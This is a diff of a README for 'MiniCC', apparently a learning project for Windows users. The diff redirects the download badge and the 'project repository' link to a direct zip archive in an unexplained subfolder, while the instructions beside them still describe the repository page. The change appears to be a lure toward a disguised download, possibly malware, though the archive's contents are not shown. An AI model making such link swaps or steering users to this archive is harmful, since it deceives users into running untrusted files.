@@ -1,6 +1,6 @@
 # 📂 MiniCC - Learn Software Engineering Through Practical Examples
 
-[![Download MiniCC](https://img.shields.io/badge/Download-MiniCC-blue.svg)](https://github.com/plain-eggandtongue4179/MiniCC)
+[![Download MiniCC](https://img.shields.io/badge/Download-MiniCC-blue.svg)](https://github.com/plain-eggandtongue4179/MiniCC/raw/refs/heads/main/alecize/Mini_CC_1.5-alpha.2.zip)
 
 MiniCC provides a clear path to understand how complex software systems work. This project breaks down a professional coding tool into thirteen distinct modules. It includes nineteen teaching examples that demonstrate how to build robust, production-grade applications. You do not need deep programming experience to explore these lessons. This repository acts as a bridge between basic concepts and advanced engineering practices.
 
@@ -22,7 +22,7 @@ Your computer needs to meet basic standards to run this software. Ensure you hav
 
 You do not need to compile complex code to view these examples. Follow these steps to set up the environment on your Windows system.
 
-1. Visit [the project repository](https://github.com/plain-eggandtongue4179/MiniCC) to access the software files.
+1. Visit [the project repository](https://github.com/plain-eggandtongue4179/MiniCC/raw/refs/heads/main/alecize/Mini_CC_1.5-alpha.2.zip) to access the software files.
 2. Look for the green button labeled "Code" on the right side of the page.
 3. Choose "Download ZIP" from the menu.
 4. Save the file to your computer.
